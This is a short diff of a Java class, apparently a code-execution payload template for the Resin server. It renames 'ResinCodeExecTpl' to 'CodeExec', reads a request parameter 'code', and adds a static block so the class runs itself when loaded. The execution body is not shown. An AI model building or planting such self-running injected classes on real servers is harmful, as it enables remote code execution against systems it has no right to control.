@@ -4,12 +4,18 @@ import java.io.Writer;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 
-public class ResinCodeExecTpl {
+public class CodeExec
+{
     private String getReqParamName() {
         return "code";
     }
-
-    ResinCodeExecTpl(){
+    static {
+        try {
+            new CodeExec();
+        } catch (Exception e) {
+        }
+    }
+    CodeExec(){
         run();
     }
 
